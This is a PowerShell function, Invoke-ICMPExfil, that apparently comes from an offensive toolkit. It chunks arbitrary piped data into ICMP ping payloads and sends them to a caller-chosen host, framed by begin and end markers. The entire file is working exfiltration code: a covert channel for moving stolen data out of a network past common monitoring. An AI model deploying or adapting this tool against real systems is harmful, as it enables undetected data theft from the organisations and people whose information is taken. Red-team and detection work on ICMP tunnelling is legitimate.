Function Invoke-ICMPExfil {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $true)]
        [String]$Payload,
        [Parameter(Mandatory = $true, Position = 0)]
        [String]$Target,
        [Parameter()]
        [Int]$MaxSize = 1472
    )

    Begin {
        $ICMPClient = New-Object System.Net.NetworkInformation.Ping
        $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
        $PingOptions.DontFragment = $true

        if ($Payload -eq "") { $Payload = "`n" }

        $ICMPClient.Send($Target, 10, ([text.encoding]::ASCII).GetBytes("---begin---"), $PingOptions) | Out-Null
    }

    Process {
        0..[math]::floor($Payload.length / $MaxSize) | % {
            $chunk = $Payload.substring($MaxSize * $_, [math]::min($MaxSize, $Payload.length - $MaxSize * $_))
            $buff = ([text.encoding]::ASCII).GetBytes($chunk)
            Write-Verbose "Sending: $chunk"
            $ICMPClient.Send($Target, 10, $buff, $PingOptions) | Out-Null
        }
    }

    End {
        $ICMPClient.Send($Target, 10, ([text.encoding]::ASCII).GetBytes("---end---"), $PingOptions) | Out-Null
    }
}
